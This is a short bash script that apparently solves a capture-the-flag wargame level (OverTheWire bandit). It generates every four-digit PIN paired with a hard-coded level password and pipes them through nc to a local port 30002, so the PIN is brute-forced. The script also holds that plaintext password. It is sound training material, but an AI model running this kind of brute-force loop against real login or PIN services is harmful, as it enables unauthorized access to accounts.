#!/bin/bash

#make a combination of bandit25pass and PIN (0000-9999)
for i in $(seq -w 0000 9999); do
        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> passPIN
done

#try the combination passPIN file line by line on nc and save it at out.txt (bruteforce)
cat passPIN | nc localhost 30002 > out.txt

#printed line by line to search for the password and the PIN
cat -n out.txt | grep -v "Wrong"
